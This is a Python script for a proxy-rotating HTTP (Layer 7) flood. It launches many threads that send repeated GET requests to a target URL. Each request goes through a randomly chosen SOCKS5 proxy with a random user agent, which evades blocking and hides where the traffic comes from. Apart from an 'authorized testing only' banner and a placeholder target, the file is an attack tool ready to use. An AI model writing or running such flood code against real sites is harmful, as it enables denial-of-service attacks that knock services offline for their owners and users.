import requests
import threading
import random
import time

# Sample user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)"
]

# Optional fake paths
PATHS = ["/", "/home", "/api", "/login", "/products", "/search?q=chatgpt"]

# Load proxies from file
def load_proxies(filename="proxy.txt"):
    try:
        with open(filename, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(proxies)} SOCKS5 proxies.")
        return proxies
    except FileNotFoundError:
        print("❌ proxy.txt file not found!")
        return []

# Flood function using SOCKS5 proxy
def attack(url, request_count, proxies):
    session = requests.Session()

    for i in range(request_count):
        try:
            proxy = random.choice(proxies)
            path = random.choice(PATHS)
            full_url = url.rstrip("/") + path

            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Connection": "keep-alive"
            }

            proxy_dict = {
                "http": proxy,
                "https": proxy
            }

            response = session.get(full_url, headers=headers, proxies=proxy_dict, timeout=10)
            print(f"[{threading.current_thread().name}] ✅ {response.status_code} - {proxy}")
        except Exception as e:
            print(f"[{threading.current_thread().name}] ❌ Proxy Error: {e}")

# Main flood starter
def start_flood(url, threads, requests_per_thread, proxy_file="proxy.txt"):
    proxies = load_proxies(proxy_file)
    if not proxies:
        print("⛔ No valid proxies found. Exiting.")
        return

    print(f"🚀 Starting SOCKS5 Layer 7 Flood | Target: {url} | Threads: {threads} | Requests/Thread: {requests_per_thread}")
    print("⚠️ Authorized testing only!")

    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack, args=(url, requests_per_thread, proxies), name=f"Thread-{i+1}")
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()

    print("✅ Flood complete.")

# Run
if __name__ == "__main__":
    target_url = "https://your-test-server.com"  # Your test server only
    thread_count = 50
    requests_per_thread = 100

    start_flood(target_url, thread_count, requests_per_thread)
